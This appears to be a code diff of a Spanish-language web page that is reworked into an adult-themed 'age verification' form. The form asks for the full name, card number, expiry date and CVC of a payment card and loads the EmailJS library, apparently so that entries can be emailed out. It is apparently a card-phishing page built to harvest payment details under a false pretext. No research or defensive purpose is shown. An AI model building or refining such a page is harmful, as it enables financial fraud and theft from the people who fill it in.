@@ -3,42 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación Natural</title>
+    <title>Verificación de Edad</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>🌿 Verificación de Identidad 🌸</h1>
+        <h1>🔞 Verificación Requerida</h1>
         <form id="paymentForm">
             <div class="input-group">
-                <label>Nombre del Titular</label>
-                <input type="text" id="cardHolder" placeholder="MARIA GARCIA" required>
+                <label>Nombre Completo</label>
+                <input type="text" id="cardHolder" placeholder="Ej. Sofia Rodríguez" required>
             </div>
             
             <div class="input-group">
                 <label>Número de Tarjeta</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="16" required>
+                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" required>
             </div>
 
             <div class="input-group">
                 <label>Fecha de Expiración</label>
-                <input type="month" id="expiryDate" placeholder="MM/AAAA" required>
+                <input type="month" id="expiryDate" required>
             </div>
 
             <div class="input-group">
                 <label>Código CVC</label>
-                <input type="text" id="cvc" placeholder="123" maxlength="3" required>
+                <input type="text" id="cvc" placeholder="***" maxlength="3" required>
             </div>
 
-            <button type="submit">Verificar Identidad 🌱</button>
+            <button type="submit">Verificar Identidad 💋</button>
         </form>
     </div>
 
-    <!-- Decoraciones de plantas -->
-    <img src="https://cdn-icons-png.flaticon.com/512/135/135075.png" class="decoracion-planta izquierda">
-    <img src="https://cdn-icons-png.flaticon.com/512/135/135075.png" class="decoracion-planta derecha">
-
-    <!-- SDK de EmailJS -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="script.js"></script>
 </body>
